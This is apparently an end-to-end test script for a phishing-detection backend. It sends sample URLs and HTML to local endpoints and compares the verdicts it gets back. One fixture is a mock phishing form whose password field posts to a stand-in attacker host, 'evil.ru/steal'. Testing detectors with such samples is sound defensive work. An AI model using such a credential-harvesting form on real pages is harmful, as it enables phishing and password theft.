"""Quick E2E backend verification script."""
import httpx
import asyncio
import json

BASE = "http://localhost:8000"

TESTS = [
    {
        "name": "Obvious Phish (PayPal Fake)",
        "payload": {
            "url": "https://paypal-secure-login.xyz/account/verify",
            "htmlExcerpt": "<form action='http://evil.ru/steal'><input name='password' type='password'></form>",
            "features": None
        },
        "expect_verdict": "PHISH"
    },
    {
        "name": "Legitimate Site (Google)",
        "payload": {
            "url": "https://www.google.com",
            "htmlExcerpt": "<html><body><div class='search-box'><input type='text'></div></body></html>",
            "features": None
        },
        "expect_verdict": "SAFE"
    },
    {
        "name": "Community Check (Google)",
        "endpoint": "/community/check",
        "method": "GET",
        "params": {"url": "https://www.google.com"}
    }
]

async def run_tests():
    print("="*60)
    print("PhishGuard++ Backend Verification")
    print("="*60)
    
    async with httpx.AsyncClient(timeout=60.0) as client:
        # Health check
        try:
            r = await client.get(f"{BASE}/docs")
            print(f"✅ Backend reachable — Status {r.status_code}")
        except Exception as e:
            print(f"❌ Backend unreachable: {e}")
            return

        print()
        for test in TESTS:
            name = test["name"]
            endpoint = test.get("endpoint", "/analyze/cloud")
            method = test.get("method", "POST")
            
            try:
                if method == "GET":
                    r = await client.get(f"{BASE}{endpoint}", params=test.get("params", {}))
                else:
                    r = await client.post(f"{BASE}{endpoint}", json=test["payload"])
                
                data = r.json()
                verdict = data.get("verdict", data.get("found", "N/A"))
                score = data.get("score", "N/A")
                tier = data.get("tier", "N/A")
                
                expected = test.get("expect_verdict")
                status = "✅" if (not expected or verdict == expected) else "⚠️"
                
                print(f"{status} {name}")
                print(f"   Verdict: {verdict} | Score: {score} | Tier: {tier}")
                if "reason" in data:
                    reason = data["reason"][:100].replace("\n", " ")
                    print(f"   Reason: {reason}...")
                print()
                
            except Exception as e:
                print(f"❌ {name} — Error: {e}")
                print()

if __name__ == "__main__":
    asyncio.run(run_tests())
